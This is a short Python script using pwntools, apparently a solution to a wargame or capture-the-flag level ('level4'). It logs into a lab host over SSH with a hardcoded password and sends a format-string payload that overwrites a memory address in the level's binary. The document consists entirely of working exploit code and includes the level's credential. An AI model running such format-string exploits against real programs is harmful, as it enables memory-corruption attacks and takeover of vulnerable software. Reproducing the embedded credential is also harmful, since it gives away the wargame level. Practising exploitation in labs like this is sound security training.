from pwn import *


# Change host according to your configuration
s = ssh(
    user="level4",
    host="192.168.56.8",
    password="b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa",
    port=4242
)

# the format string offset
offset = 12

# the writes you want to perform
writes = {
    0x8049810: 0x1025544,  # write 0x1025544 at 0x8049810
}

# you can use the `fmtstr_payload` function to automatically
# generate a payload that performs the writes you specify
payload = fmtstr_payload(offset, writes)

p = s.process("/home/user/level4/level4")
p.writeline(payload)

#p.interactive()
p.stream()

p.close()
s.close()
